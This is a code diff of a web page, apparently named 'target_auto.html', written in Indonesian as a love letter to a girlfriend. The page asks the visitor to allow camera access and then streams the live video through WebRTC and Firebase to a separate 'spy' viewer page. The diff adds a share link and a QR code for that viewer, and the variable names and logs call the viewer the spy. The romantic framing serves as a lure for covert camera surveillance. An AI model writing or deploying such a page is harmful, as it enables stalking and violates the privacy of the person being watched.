@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💌 Untuk Pacarku</title>
+    <title>💌 Surat Cinta</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,13 +25,33 @@
         h1 { color: #ff4081; margin-bottom: 20px; }
         #status { margin: 20px 0; min-height: 24px; }
         #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
-        #roomId { 
+        #shareLink { 
             background: #f0f0f0; 
             padding: 10px; 
             border-radius: 5px; 
             margin: 10px 0;
             font-family: monospace;
+            word-break: break-all;
             display: none;
+        }
+        button {
+            background: #ff4081;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        .qr-container {
+            margin: 20px 0;
+            display: none;
+        }
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
         }
     </style>
 </head>
@@ -40,18 +60,24 @@
         <h1>💖 Untuk Pacarku</h1>
         <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
         
-        <button id="startBtn" onclick="startCamera()">📸 Izinkan Kamera</button>
+        <button onclick="startCamera()">📸 Izinkan Kamera</button>
         
-        <div id="status"></div>
+        <div id="status">Klik tombol di atas untuk memulai</div>
         
-        <div id="roomId"></div>
+        <div id="shareLink"></div>
+        
+        <div class="qr-container" id="qrContainer">
+            <p>Scan QR code ini dari HP lain:</p>
+            <canvas id="qrcode"></canvas>
+        </div>
         
         <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <!-- FIREBASE v8 (STABLE VERSION) -->
+    <!-- Firebase & QR Code -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     
     <script>
         // ========== CONFIG ==========
@@ -65,7 +91,6 @@
             appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
         
-        // ========== INIT ==========
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
@@ -76,9 +101,19 @@
         let offerListener;
         let candidateListener;
         
+        // ========== GENERATE ROOM ID ==========
+        function generateRoomId() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // No confusing chars
+            let result = '';
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
         // ========== START CAMERA ==========
         async function startCamera() {
-            const btn = document.getElementById('startBtn');
+            const btn = event.target;
             const status = document.getElementById('status');
             
             btn.disabled = true;
@@ -98,24 +133,42 @@
                 
                 // 2. CREATE ROOM
                 roomId = generateRoomId();
-                document.getElementById('roomId').style.display = 'block';
-                document.getElementById('roomId').textContent = `Kode: ${roomId}`;
+                await database.ref('rooms/' + roomId).remove(); // Clean old
                 
-                // Clean old room data
-                await database.ref('rooms/' + roomId).remove();
+                // 3. CREATE SHARE LINK
+                const shareLink = `${window.location.origin}${window.location.pathname.replace('target_auto.html', 'spy_auto.html')}?room=${roomId}`;
                 
-                // 3. SETUP WEBRTC
+                document.getElementById('shareLink').style.display = 'block';
+                document.getElementById('shareLink').innerHTML = `
+                    <strong>Share link ini ke pacarmu:</strong><br>
+                    <a href="${shareLink}" target="_blank">${shareLink}</a>
+                    <br><br>
+                    <strong>Atau scan QR code:</strong>
+                `;
+                
+                // 4. GENERATE QR CODE
+                document.getElementById('qrContainer').style.display = 'block';
+                QRCode.toCanvas(document.getElementById('qrcode'), shareLink, {
+                    width: 200,
+                    margin: 2,
+                    color: {
+                        dark: '#ff4081',
+                        light: '#ffffff'
+                    }
+                });
+                
+                // 5. SETUP WEBRTC
                 setupWebRTC();
                 
-                // 4. SETUP LISTENERS
+                // 6. SETUP LISTENERS
                 setupListeners();
                 
-                status.innerHTML = "✅ Kamera aktif! Beri kode ini ke pacarmu:";
+                status.innerHTML = "✅ Kamera aktif! Bagikan link di atas ke pacarmu";
                 
             } catch (error) {
                 status.innerHTML = `❌ Error: ${error.message}`;
                 btn.disabled = false;
-                btn.textContent = "🔄 Coba Lagi";
+                btn.textContent = "📸 Izinkan Kamera";
             }
         }
         
@@ -128,12 +181,10 @@
                 ]
             });
             
-            // Add local stream
             localStream.getTracks().forEach(track => {
                 peerConnection.addTrack(track, localStream);
             });
             
-            // ICE candidate handler
             peerConnection.onicecandidate = (event) => {
                 if (event.candidate) {
                     database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
@@ -143,25 +194,22 @@
         
         // ========== SETUP LISTENERS ==========
         function setupListeners() {
-            // Listen for spy's offer
             offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                 const offer = snapshot.val();
                 if (offer && peerConnection.signalingState === 'stable') {
-                    console.log("📥 Received offer");
+                    console.log("📥 Offer received from spy");
                     
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                     
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
                     
-                    // Send answer
                     await database.ref(`rooms/${roomId}/answer`).set(answer);
                     
                     document.getElementById('status').innerHTML = "🔴 Terhubung dengan pacar!";
                 }
             });
             
-            // Listen for spy's ICE candidates
             candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
                 const candidate = snapshot.val();
                 if (candidate) {
@@ -172,11 +220,6 @@
                     }
                 }
             });
-        }
-        
-        // ========== UTILS ==========
-        function generateRoomId() {
-            return Math.random().toString(36).substring(2, 10).toUpperCase();
         }
         
         // ========== CLEANUP ==========
@@ -192,4 +235,4 @@
         window.addEventListener('pagehide', cleanup);
     </script>
 </body>
-</html>
+        </html>
